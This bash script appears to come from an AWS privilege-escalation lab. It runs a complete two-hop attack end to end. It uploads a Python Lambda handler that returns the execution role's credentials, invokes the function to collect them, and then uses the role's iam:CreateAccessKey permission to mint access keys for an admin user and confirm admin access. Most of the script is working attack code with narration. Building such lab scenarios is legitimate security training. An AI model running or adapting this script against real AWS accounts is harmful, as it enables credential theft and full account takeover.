#!/bin/bash

# Demo script for Lambda UpdateFunctionCode + IAM CreateAccessKey multi-hop privilege escalation
# This scenario demonstrates a two-hop attack:
#   Hop 1: Update Lambda function code and invoke it to exfiltrate execution role credentials
#   Hop 2: Use the Lambda role credentials to create access keys for an admin user


# Disable AWS CLI paging
export AWS_PAGER=""

# Colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m' # No Color

# Dim color for command display
DIM='\033[2m'
CYAN='\033[0;36m'

# Track attack commands for summary
ATTACK_COMMANDS=()

# Display a command before executing it
show_cmd() {
    echo -e "${DIM}\$ $*${NC}"
}

# Display AND record an attack command
show_attack_cmd() {
    echo -e "\n${CYAN}\$ $*${NC}"
    ATTACK_COMMANDS+=("$*")
}

# Configuration
STARTING_USER="pl-prod-lambda-004-to-iam-002-starting-user"
TARGET_LAMBDA="pl-prod-lambda-004-to-iam-002-target-function"
LAMBDA_ROLE="pl-prod-lambda-004-to-iam-002-lambda-role"
ADMIN_USER="pl-prod-lambda-004-to-iam-002-admin-user"

echo -e "${GREEN}========================================${NC}"
echo -e "${GREEN}Lambda UpdateFunctionCode + IAM CreateAccessKey${NC}"
echo -e "${GREEN}Multi-Hop Privilege Escalation Demo${NC}"
echo -e "${GREEN}========================================${NC}\n"

echo -e "${BLUE}Attack Path:${NC}"
echo "starting_user -> (lambda:UpdateFunctionCode + lambda:InvokeFunction) -> lambda_role credentials"
echo "              -> (iam:CreateAccessKey) -> admin_user -> admin access"
echo ""

# Step 1: Retrieve credentials and region from Terraform outputs
echo -e "${YELLOW}Step 1: Retrieving scenario configuration from Terraform${NC}"
cd ../../../../../..  # Navigate to root of terraform project

# Get the module output using the grouped output pattern
MODULE_OUTPUT=$(terraform output -json 2>/dev/null | jq -r '.single_account_privesc_multi_hop_to_admin_lambda_004_to_iam_002.value // empty')

if [ -z "$MODULE_OUTPUT" ]; then
    echo -e "${RED}Error: Could not find terraform output${NC}"
    echo "Make sure you've deployed this scenario with: terraform apply"
    exit 1
fi

# Extract credentials from the grouped output
STARTING_ACCESS_KEY_ID=$(echo "$MODULE_OUTPUT" | jq -r '.starting_user_access_key_id')
STARTING_SECRET_ACCESS_KEY=$(echo "$MODULE_OUTPUT" | jq -r '.starting_user_secret_access_key')

if [ "$STARTING_ACCESS_KEY_ID" == "null" ] || [ -z "$STARTING_ACCESS_KEY_ID" ]; then
    echo -e "${RED}Error: Could not extract credentials from terraform output${NC}"
    exit 1
fi

# Get region
AWS_REGION=$(terraform output -raw aws_region 2>/dev/null || echo "")

if [ -z "$AWS_REGION" ]; then
    echo -e "${YELLOW}Warning: Could not retrieve region from Terraform, defaulting to us-east-1${NC}"
    AWS_REGION="us-east-1"
fi

echo "Retrieved access key for: $STARTING_USER"
echo "Access Key ID: ${STARTING_ACCESS_KEY_ID:0:10}..."
echo "Region: $AWS_REGION"
echo -e "${GREEN}✓ Retrieved configuration from Terraform${NC}\n"

# Navigate back to scenario directory
cd - > /dev/null

# Step 2: Configure AWS credentials with starting user
echo -e "${YELLOW}Step 2: Configuring AWS CLI with starting user credentials${NC}"
export AWS_ACCESS_KEY_ID=$STARTING_ACCESS_KEY_ID
export AWS_SECRET_ACCESS_KEY=$STARTING_SECRET_ACCESS_KEY
export AWS_REGION=$AWS_REGION
unset AWS_SESSION_TOKEN

echo "Using region: $AWS_REGION"

# Verify starting user identity
show_cmd aws sts get-caller-identity --query 'Arn' --output text
CURRENT_USER=$(aws sts get-caller-identity --query 'Arn' --output text)
echo "Current identity: $CURRENT_USER"

if [[ ! $CURRENT_USER == *"$STARTING_USER"* ]]; then
    echo -e "${RED}Error: Not running as $STARTING_USER${NC}"
    exit 1
fi
echo -e "${GREEN}✓ Verified starting user identity${NC}\n"

# Step 3: Get account ID
echo -e "${YELLOW}Step 3: Getting account ID${NC}"
show_cmd aws sts get-caller-identity --query 'Account' --output text
ACCOUNT_ID=$(aws sts get-caller-identity --query 'Account' --output text)
echo "Account ID: $ACCOUNT_ID"
echo -e "${GREEN}✓ Retrieved account ID${NC}\n"

# Step 4: Verify we don't have admin permissions yet
echo -e "${YELLOW}Step 4: Verifying we don't have admin permissions yet${NC}"
echo "Attempting to list IAM users (should fail)..."
show_cmd aws iam list-users --max-items 1
if aws iam list-users --max-items 1 &> /dev/null; then
    echo -e "${RED}Warning: Unexpectedly have admin permissions already${NC}"
else
    echo -e "${GREEN}✓ Confirmed: Cannot list IAM users (as expected)${NC}"
fi
echo ""

# Step 5: Verify we can't create access keys directly
echo -e "${YELLOW}Step 5: Verifying we can't create access keys for admin user directly${NC}"
echo "Attempting to create access key for $ADMIN_USER (should fail)..."
if aws iam create-access-key --user-name $ADMIN_USER &> /dev/null; then
    echo -e "${RED}Warning: Unexpectedly can create access keys directly${NC}"
else
    echo -e "${GREEN}✓ Confirmed: Cannot create access keys for admin user directly (as expected)${NC}"
fi
echo ""

# Step 6: Get target Lambda function details
echo -e "${YELLOW}Step 6: Discovering target Lambda function${NC}"
echo "Target Lambda function: $TARGET_LAMBDA"

# Get function details
FUNCTION_INFO=$(aws lambda get-function \
    --region $AWS_REGION \
    --function-name $TARGET_LAMBDA \
    --output json 2>/dev/null)

if [ $? -ne 0 ]; then
    echo -e "${RED}Error: Could not get Lambda function details${NC}"
    exit 1
fi

# Extract handler name and role
HANDLER_NAME=$(echo "$FUNCTION_INFO" | jq -r '.Configuration.Handler')
FUNCTION_ROLE=$(echo "$FUNCTION_INFO" | jq -r '.Configuration.Role')
RUNTIME=$(echo "$FUNCTION_INFO" | jq -r '.Configuration.Runtime')

echo "Handler: $HANDLER_NAME"
echo "Runtime: $RUNTIME"
echo "Execution Role: $FUNCTION_ROLE"
echo -e "${GREEN}✓ Retrieved function details${NC}"
echo ""
echo -e "${BLUE}Key observation:${NC}"
echo "This Lambda function runs with a role that has iam:CreateAccessKey permission."
echo "If we can update the code and invoke it, we can exfiltrate the role's credentials!"
echo ""

# Step 7: Backup original Lambda function code
echo -e "${YELLOW}Step 7: Backing up original Lambda function code${NC}"
echo "Downloading original code for restoration after demo..."

# Get the code location
CODE_LOCATION=$(echo "$FUNCTION_INFO" | jq -r '.Code.Location')

# Download original code
curl -s "$CODE_LOCATION" -o /tmp/original_lambda_backup.zip

if [ $? -eq 0 ]; then
    echo -e "${GREEN}✓ Original code backed up to /tmp/original_lambda_backup.zip${NC}"
else
    echo -e "${RED}Error: Could not backup original code${NC}"
    exit 1
fi
echo ""

# Step 8: Create malicious Lambda function code that exfiltrates credentials
echo -e "${YELLOW}Step 8: Creating malicious Lambda function code${NC}"
echo "Creating Python code that will exfiltrate Lambda execution role credentials..."
echo ""
echo -e "${BLUE}HOP 1: Lambda code injection to extract execution role credentials${NC}"

# CRITICAL: Filename must match handler name
# Handler is "lambda_function.lambda_handler" so file must be "lambda_function.py"
cat > /tmp/lambda_function.py << 'EOF'
import json
import os

def lambda_handler(event, context):
    """
    Malicious Lambda function that extracts and returns the execution role's credentials.
    These credentials come from the Lambda execution environment variables.
    """
    # Extract credentials from environment variables
    # Lambda automatically injects these for the execution role
    credentials = {
        'AWS_ACCESS_KEY_ID': os.environ.get('AWS_ACCESS_KEY_ID', 'NOT_FOUND'),
        'AWS_SECRET_ACCESS_KEY': os.environ.get('AWS_SECRET_ACCESS_KEY', 'NOT_FOUND'),
        'AWS_SESSION_TOKEN': os.environ.get('AWS_SESSION_TOKEN', 'NOT_FOUND'),
        'AWS_REGION': os.environ.get('AWS_REGION', os.environ.get('AWS_DEFAULT_REGION', 'NOT_FOUND'))
    }

    print(f"Extracted credentials for role execution")

    return {
        'statusCode': 200,
        'body': json.dumps({
            'success': True,
            'message': 'Credentials extracted from Lambda execution environment',
            'credentials': credentials
        })
    }
EOF

echo -e "${GREEN}✓ Malicious code created${NC}\n"

# Step 9: Package the malicious code
echo -e "${YELLOW}Step 9: Packaging malicious code into deployment package${NC}"
cd /tmp
zip -q lambda_function.zip lambda_function.py
cd - > /dev/null

if [ -f /tmp/lambda_function.zip ]; then
    echo -e "${GREEN}✓ Malicious code packaged${NC}"
else
    echo -e "${RED}Error: Failed to create zip file${NC}"
    rm -f /tmp/lambda_function.py
    exit 1
fi
echo ""

# Step 10: Update Lambda function code
echo -e "${YELLOW}Step 10: Updating Lambda function code with credential exfiltration payload${NC}"
echo -e "${BLUE}Attack Vector: lambda:UpdateFunctionCode${NC}"
echo "Function: $TARGET_LAMBDA"
echo ""
echo "Executing: aws lambda update-function-code --function-name $TARGET_LAMBDA"

show_attack_cmd aws lambda update-function-code --region $AWS_REGION --function-name $TARGET_LAMBDA --zip-file fileb:///tmp/lambda_function.zip --output json
UPDATE_RESULT=$(aws lambda update-function-code \
    --region $AWS_REGION \
    --function-name $TARGET_LAMBDA \
    --zip-file fileb:///tmp/lambda_function.zip \
    --output json 2>&1)

if [ $? -eq 0 ]; then
    LAST_UPDATE_STATUS=$(echo "$UPDATE_RESULT" | jq -r '.LastUpdateStatus')
    echo "Update Status: $LAST_UPDATE_STATUS"
    echo -e "${GREEN}✓ Successfully updated Lambda function code!${NC}"
else
    echo -e "${RED}Error: Failed to update Lambda function code${NC}"
    echo "$UPDATE_RESULT"
    rm -f /tmp/lambda_function.py /tmp/lambda_function.zip
    exit 1
fi
echo ""

# Step 11: Wait for Lambda to process the update
echo -e "${YELLOW}Step 11: Waiting for Lambda to process code update${NC}"
echo "Allowing time for Lambda to deploy the new code..."
sleep 15
echo -e "${GREEN}✓ Lambda function updated${NC}\n"

# Step 12: Invoke the malicious Lambda function to exfiltrate credentials
echo -e "${YELLOW}Step 12: Invoking Lambda function to exfiltrate execution role credentials${NC}"
echo -e "${BLUE}Attack Vector: lambda:InvokeFunction${NC}"
echo "Function: $TARGET_LAMBDA"
echo ""
echo "This is where we extract the Lambda role's credentials!"
echo "The malicious code will return the role's temporary credentials."
echo ""
echo "Executing: aws lambda invoke --function-name $TARGET_LAMBDA"

show_attack_cmd aws lambda invoke --region $AWS_REGION --function-name $TARGET_LAMBDA --payload '{}' /tmp/response.json --output json
aws lambda invoke \
    --region $AWS_REGION \
    --function-name $TARGET_LAMBDA \
    --payload '{}' \
    /tmp/response.json \
    --output json > /dev/null

if [ $? -eq 0 ]; then
    echo -e "${GREEN}✓ Lambda function invoked successfully${NC}"
    echo ""
    echo "Response from Lambda function:"
    cat /tmp/response.json | jq '.'
    echo ""
else
    echo -e "${RED}Error: Failed to invoke Lambda function${NC}"
    rm -f /tmp/lambda_function.py /tmp/lambda_function.zip /tmp/response.json /tmp/original_lambda_backup.zip
    exit 1
fi

# Step 13: Extract Lambda role credentials from response
echo -e "${YELLOW}Step 13: Extracting Lambda role credentials from response${NC}"

# Parse the nested JSON response
RESPONSE_BODY=$(cat /tmp/response.json | jq -r '.body')
LAMBDA_ACCESS_KEY=$(echo "$RESPONSE_BODY" | jq -r '.credentials.AWS_ACCESS_KEY_ID')
LAMBDA_SECRET_KEY=$(echo "$RESPONSE_BODY" | jq -r '.credentials.AWS_SECRET_ACCESS_KEY')
LAMBDA_SESSION_TOKEN=$(echo "$RESPONSE_BODY" | jq -r '.credentials.AWS_SESSION_TOKEN')
LAMBDA_REGION=$(echo "$RESPONSE_BODY" | jq -r '.credentials.AWS_REGION')

if [ "$LAMBDA_ACCESS_KEY" == "NOT_FOUND" ] || [ -z "$LAMBDA_ACCESS_KEY" ]; then
    echo -e "${RED}Error: Could not extract Lambda role credentials${NC}"
    rm -f /tmp/lambda_function.py /tmp/lambda_function.zip /tmp/response.json /tmp/original_lambda_backup.zip
    exit 1
fi

echo "Extracted Lambda Role Credentials:"
echo "  Access Key ID: ${LAMBDA_ACCESS_KEY:0:10}..."
echo "  Session Token: ${LAMBDA_SESSION_TOKEN:0:20}..."
echo -e "${GREEN}✓ Successfully extracted Lambda role credentials!${NC}"
echo ""
echo -e "${GREEN}========================================${NC}"
echo -e "${GREEN}HOP 1 COMPLETE - Lambda role credentials obtained${NC}"
echo -e "${GREEN}========================================${NC}"
echo ""

# Step 14: Switch to Lambda role credentials
echo -e "${YELLOW}Step 14: Switching to Lambda role credentials${NC}"
echo -e "${BLUE}HOP 2: Using Lambda role's iam:CreateAccessKey permission${NC}"
echo ""

export AWS_ACCESS_KEY_ID=$LAMBDA_ACCESS_KEY
export AWS_SECRET_ACCESS_KEY=$LAMBDA_SECRET_KEY
export AWS_SESSION_TOKEN=$LAMBDA_SESSION_TOKEN
export AWS_REGION=$AWS_REGION

# Verify we're now the Lambda role
show_cmd aws sts get-caller-identity --query 'Arn' --output text
LAMBDA_IDENTITY=$(aws sts get-caller-identity --query 'Arn' --output text)
echo "New identity: $LAMBDA_IDENTITY"

if [[ ! $LAMBDA_IDENTITY == *"$LAMBDA_ROLE"* ]]; then
    echo -e "${YELLOW}Note: Identity doesn't match expected role name pattern${NC}"
    echo "This is expected for assumed-role sessions"
fi
echo -e "${GREEN}✓ Now using Lambda execution role credentials${NC}\n"

# Step 15: Verify Lambda role's permissions
echo -e "${YELLOW}Step 15: Verifying Lambda role permissions${NC}"
echo "The Lambda role should have iam:CreateAccessKey permission..."
echo "Attempting to list IAM users (may or may not be allowed)..."
show_cmd aws iam list-users --max-items 1
if aws iam list-users --max-items 1 &> /dev/null; then
    echo -e "${YELLOW}Lambda role can list IAM users${NC}"
else
    echo -e "${GREEN}Lambda role cannot list IAM users (expected - limited permissions)${NC}"
fi
echo ""

# Step 16: Create access keys for admin user using Lambda role
echo -e "${YELLOW}Step 16: Creating access keys for admin user${NC}"
echo "Target admin user: $ADMIN_USER"
echo "Using Lambda role's iam:CreateAccessKey permission..."
echo ""

# Debug: Show current credentials info
echo -e "${BLUE}Debug: Current credentials check${NC}"
echo "AWS_ACCESS_KEY_ID: ${AWS_ACCESS_KEY_ID:0:10}..."
echo "AWS_SESSION_TOKEN set: $([ -n "$AWS_SESSION_TOKEN" ] && echo 'Yes' || echo 'No')"
echo "AWS_REGION: $AWS_REGION"
echo ""

# First, check if admin user already has max access keys
echo "Checking existing access keys for $ADMIN_USER..."
EXISTING_KEYS=$(aws iam list-access-keys --user-name $ADMIN_USER --output json 2>&1)
if [ $? -eq 0 ]; then
    KEY_COUNT=$(echo "$EXISTING_KEYS" | jq '.AccessKeyMetadata | length')
    echo "Existing access keys: $KEY_COUNT (max allowed: 2)"
    if [ "$KEY_COUNT" -ge 2 ]; then
        echo -e "${RED}Error: Admin user already has 2 access keys (AWS maximum)${NC}"
        echo -e "${YELLOW}Run cleanup_attack.sh to remove existing keys before retrying${NC}"
        rm -f /tmp/lambda_function.py /tmp/lambda_function.zip /tmp/response.json /tmp/original_lambda_backup.zip
        exit 1
    fi
else
    echo -e "${YELLOW}Note: Could not check existing access keys (may lack iam:ListAccessKeys permission)${NC}"
    echo "If create-access-key fails with LimitExceeded, run cleanup_attack.sh first"
fi
echo ""

echo "Executing: aws iam create-access-key --user-name $ADMIN_USER"

# Temporarily disable set -e to capture the error properly
set +e
show_attack_cmd aws iam create-access-key --user-name $ADMIN_USER --output json
KEY_OUTPUT=$(aws iam create-access-key --user-name $ADMIN_USER --output json 2>&1)
KEY_EXIT_CODE=$?

# Disable AWS CLI paging
export AWS_PAGER=""

if [ $KEY_EXIT_CODE -eq 0 ]; then
    NEW_ACCESS_KEY=$(echo $KEY_OUTPUT | jq -r '.AccessKey.AccessKeyId')
    NEW_SECRET_KEY=$(echo $KEY_OUTPUT | jq -r '.AccessKey.SecretAccessKey')
    echo "Created access key: $NEW_ACCESS_KEY"
    echo -e "${GREEN}✓ Successfully created access keys for admin user!${NC}"
else
    echo -e "${RED}Error: Failed to create access keys (exit code: $KEY_EXIT_CODE)${NC}"
    echo -e "${RED}Error details:${NC}"
    echo "$KEY_OUTPUT"
    echo ""
    echo -e "${YELLOW}Troubleshooting:${NC}"
    echo "1. Verify Lambda role has iam:CreateAccessKey permission on admin user"
    echo "2. Check if admin user already has 2 access keys"
    echo "3. Verify credentials are valid with: aws sts get-caller-identity"
    rm -f /tmp/lambda_function.py /tmp/lambda_function.zip /tmp/response.json /tmp/original_lambda_backup.zip
    exit 1
fi
echo ""

# Step 17: Wait for keys to initialize
echo -e "${YELLOW}Step 17: Waiting for access keys to initialize${NC}"
echo "IAM changes can take time to propagate across AWS..."
sleep 15
echo -e "${GREEN}✓ Keys should be ready${NC}\n"

# Step 18: Switch to admin user credentials
echo -e "${YELLOW}Step 18: Switching to admin user credentials${NC}"
unset AWS_SESSION_TOKEN
export AWS_ACCESS_KEY_ID=$NEW_ACCESS_KEY
export AWS_SECRET_ACCESS_KEY=$NEW_SECRET_KEY
export AWS_REGION=$AWS_REGION

# Verify admin identity
show_cmd aws sts get-caller-identity --query 'Arn' --output text
ADMIN_IDENTITY=$(aws sts get-caller-identity --query 'Arn' --output text)
echo "New identity: $ADMIN_IDENTITY"

if [[ ! $ADMIN_IDENTITY == *"$ADMIN_USER"* ]]; then
    echo -e "${RED}Error: Failed to switch to admin user${NC}"
    exit 1
fi
echo -e "${GREEN}✓ Now using admin credentials${NC}\n"

# Step 19: Verify administrator access
echo -e "${YELLOW}Step 19: Verifying administrator access${NC}"
echo "Attempting to list IAM users with admin credentials..."
echo ""

show_cmd aws iam list-users --max-items 3 --output table
if aws iam list-users --max-items 3 --output table; then
    echo ""
    echo -e "${GREEN}✓ Successfully listed IAM users!${NC}"
    echo -e "${GREEN}✓ ADMIN ACCESS CONFIRMED${NC}"
else
    echo -e "${RED}✗ Failed to list users${NC}"
    echo -e "${YELLOW}Note: IAM propagation can take longer than expected. Try waiting 30 more seconds and test again.${NC}"
fi
echo ""

# Clean up temporary files (keep backup for cleanup script)
rm -f /tmp/lambda_function.py /tmp/lambda_function.zip /tmp/response.json

if [ ${#ATTACK_COMMANDS[@]} -gt 0 ]; then
    echo -e "\n${YELLOW}Attack Commands:${NC}"
    for cmd in "${ATTACK_COMMANDS[@]}"; do
        echo -e "  ${CYAN}\$ ${cmd}${NC}"
    done
fi

# Summary
echo -e "\n${GREEN}========================================${NC}"
echo -e "${GREEN}MULTI-HOP PRIVILEGE ESCALATION SUCCESSFUL!${NC}"
echo -e "${GREEN}========================================${NC}"
echo -e "\n${YELLOW}Attack Summary:${NC}"
echo "1. Started as: $STARTING_USER"
echo "   (with lambda:UpdateFunctionCode + lambda:InvokeFunction)"
echo ""
echo "2. HOP 1: Lambda Credential Exfiltration"
echo "   - Discovered Lambda function: $TARGET_LAMBDA"
echo "   - Updated function code with credential extraction payload"
echo "   - Invoked function to receive Lambda role credentials"
echo "   - Obtained temporary credentials for: $LAMBDA_ROLE"
echo ""
echo "3. HOP 2: IAM CreateAccessKey"
echo "   - Used Lambda role's iam:CreateAccessKey permission"
echo "   - Created access keys for: $ADMIN_USER"
echo "   - Switched to admin user credentials"
echo ""
echo "4. Achieved: Full administrator access"

echo -e "\n${YELLOW}Attack Path Diagram:${NC}"
echo -e "  $STARTING_USER"
echo -e "  |"
echo -e "  | (lambda:UpdateFunctionCode)"
echo -e "  v"
echo -e "  $TARGET_LAMBDA [code modified]"
echo -e "  |"
echo -e "  | (lambda:InvokeFunction)"
echo -e "  v"
echo -e "  $LAMBDA_ROLE credentials [exfiltrated]"
echo -e "  |"
echo -e "  | (iam:CreateAccessKey)"
echo -e "  v"
echo -e "  $ADMIN_USER [access keys created]"
echo -e "  |"
echo -e "  v"
echo -e "  ADMIN ACCESS"

echo -e "\n${YELLOW}Why This Works:${NC}"
echo "- lambda:UpdateFunctionCode allows modifying the function's code"
echo "- lambda:InvokeFunction allows triggering the modified function"
echo "- Lambda functions have access to their execution role's temporary credentials"
echo "- These credentials are available via environment variables"
echo "- The Lambda role has iam:CreateAccessKey on the admin user"
echo "- Creating access keys grants persistent access to the admin account"

echo -e "\n${YELLOW}Attack Artifacts:${NC}"
echo "- Modified Lambda function: $TARGET_LAMBDA"
echo "- New access key created for: $ADMIN_USER (Key ID: $NEW_ACCESS_KEY)"
echo "- Backup of original code: /tmp/original_lambda_backup.zip"

echo -e "\n${RED}Warning: The Lambda function code has been modified${NC}"
echo -e "${RED}Warning: A new access key exists for $ADMIN_USER${NC}"
echo ""
echo -e "${YELLOW}To clean up and restore the original state:${NC}"
echo "  ./cleanup_attack.sh"
echo ""

# Mark demo as active for plabs tracking
touch "$(dirname "$0")/.demo_active"
